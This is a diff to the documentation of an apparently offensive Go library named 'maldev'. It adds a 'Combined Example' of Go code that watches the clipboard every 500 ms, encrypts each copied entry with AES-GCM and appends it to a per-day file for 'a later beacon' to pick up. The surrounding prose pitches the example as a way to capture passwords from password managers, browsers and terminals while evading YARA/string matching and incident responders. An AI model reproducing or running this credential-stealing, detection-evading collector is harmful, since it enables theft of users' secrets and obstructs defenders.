@@ -55,6 +55,51 @@ for content := range clipboard.Watch(ctx, 500*time.Millisecond) {
 
 ---
 
+## Combined Example
+
+Watch the clipboard for new text, encrypt each entry with AES-GCM before it
+ever touches a file, and stash the ciphertext in a per-day log that a later
+beacon can pick up — credentials never appear in plaintext on disk.
+
+```go
+package main
+
+import (
+	"context"
+	"fmt"
+	"log"
+	"os"
+	"time"
+
+	"github.com/oioio-space/maldev/collection/clipboard"
+	"github.com/oioio-space/maldev/crypto"
+)
+
+func main() {
+	key, err := crypto.NewAESKey()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// Per-day log — rotate automatically, limits blast radius per file.
+	logPath := fmt.Sprintf("clip-%s.bin", time.Now().Format("2006-01-02"))
+	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer f.Close()
+
+	for text := range clipboard.Watch(context.Background(), 500*time.Millisecond) {
+		blob, _ := crypto.EncryptAESGCM(key, []byte(text))
+		_, _ = f.Write(blob)
+	}
+}
+```
+
+Layered benefit: clipboard monitoring catches credentials in transit (password managers, browsers, terminals all copy-paste through the same channel), AES-GCM encryption means the on-disk artifact is opaque to YARA/string-matching, and per-day rotation limits what an incident responder recovers from a single artefact.
+
+---
+
 ## API Reference
 
 See [collection.md](../../collection.md#collectionclipboard----clipboard-monitoring)
